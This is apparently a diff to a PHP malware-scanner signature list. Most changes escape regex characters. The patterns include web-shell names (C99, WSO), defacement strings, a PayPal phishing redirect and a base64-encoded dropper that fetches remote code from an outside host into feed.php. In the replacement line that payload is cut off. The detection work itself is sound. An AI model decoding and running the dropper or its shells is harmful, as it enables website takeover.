@@ -5,7 +5,7 @@ default_use_ajax = true
 default_charset = 'Windows-1251'
 { return '127.0.0.1'; }
 ?//BREACK//?
-eval\\(base64_decode\\('JGZpbGUgPSBmb3BlbigiZmVlZC5waHAiICwidysiKTsKCiRzYT1maWxlX2dldF9jb250ZW50cygnaHR0cDovL3d3dy4zcmItc2guY29tL3Byb2plY3RzL3Rvby9mZWVkLnR4dCcpOwoKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsJHNhKTsKCmZjbG9zZSgkZmlsZSk7CgppZiAoJHdyaXRlKSB7CgplY2hvICJTZWN1cml0eSBIYXMgQmVlbiBGdWNrZWQgQnkgVW5kZXJUYWtlciI7Cn0KCmVsc2Uge2VjaG8iXCJlcm9yciBcIiI7fQoKY2htb2QoImZlZWQucGhwIiAsIDA3NTUpOw=='\\)\\)
+eval\\(base64_decode\\('JGZpbGUgPSBmb3BlbigiZmVlZC5waHAiICwidysiKTsKCiRzYT1maWxlX2dldF9jb250ZW50cygnaHR0cDovL3d3dy4zcmItc2guY29tL3Byb2plY3RzL3Rvby9mZWVkLnR4dCcpOwoKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsJHNhKTsKCmZjbG9zZSgkZmlsZSk7CgppZiAoJHdyaXRlKSB7CgplY2hvICJTZWN1c$
 \\<?php eval \\(gzinflate\\(base64_decode\\(str_rot13\\(
 r = Math.floor\\(Math.random\\(\\) \\* 10000\\);
 MySQL Interface \\(Developed By Mohajer22\\)
@@ -34,8 +34,8 @@ system\\("python cp.py $url config"\\)
 unlink \\('cp.py'\\)
 if\\($_POST['matikan']=='sekatan'\\)
 if\\($_POST['mendapatkan']=='passwd'\\)
-mkdir\\($fn\\)
-chdir\\($fn\\)
+mkdir\\(\\$fn\\)
+chdir\\(\\$fn\\)
 Hacked by H4x0r HuSsY
 Struck by H4x0r
 SECURITY BREACHED BY
@@ -59,7 +59,7 @@ tourquise/top-chef-s09e08.html
 LyogU3VjdXJpIGludGVncml0eSBtb25pdG9yIC4gCiAqIENvbm5lY3RzIGJhY2sgaG9tZS4KICog
 L2hvbWUvYmFpbGV5bC9wdWJsaWNfaHRtbA==
 ArkealoGeNDz Mailer
-n9a2d8ce3\\($v01b6e203\\)
+n9a2d8ce3\\(\\$v01b6e203\\)
 C99 Modified By Psych0
 Cyb3r-dz Config Fuck Script
 Coded By Cyb3r-DZ
@@ -72,7 +72,8 @@ By Hadidi44
 Turk-m Mailer Inbox Sender
 Web Dev Plus / Integrated Security Portal
 WSO 2.5 Suid, edit by antichat
-function fteil_macros\\($content,$fteil\\)
+function fteil_macros\\(\\$content,\\$fteil\\)
 fopen\\("/usr/bin/host", "rb"\\);
 Erreur : Connexion - PayPal
 header \\('Location:http://PayPal.com'\\)
+f49d9c81ab9ea4e00cd6dc5c848cb341
